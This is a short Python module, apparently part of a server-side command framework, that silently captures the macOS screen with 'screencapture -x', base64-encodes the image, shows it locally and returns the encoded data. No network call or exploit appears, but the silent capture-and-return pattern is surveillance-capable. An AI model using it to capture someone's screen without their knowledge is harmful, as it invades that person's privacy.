import os
import base64
from PIL import Image
from apps.server.modules.libs.mod_interfaceRunCmd import mod_interfaceRunCmd

OUTPUT_FILE = "tmp/sc_tmp.png"
TOOL_CMD = "screencapture -x"


class mod_screenshot(mod_interfaceRunCmd):

    def setup_mod(self):
        print(f'Module Setup (mod_screenshot) called successfully!')

    def run_mod(self, cmd = ""):
        return self.take_screenshot()

    def take_screenshot(self):
        self.run_command(TOOL_CMD + " " + OUTPUT_FILE)
        image = open(OUTPUT_FILE, 'rb')
        image_read = image.read()
        image_64_encode = base64.encodebytes(image_read)
        print(f'Screenshot taken successfully!')
        with Image.open(OUTPUT_FILE) as img:
            img.show()
        os.remove(OUTPUT_FILE)
        return image_64_encode.decode("utf-8")
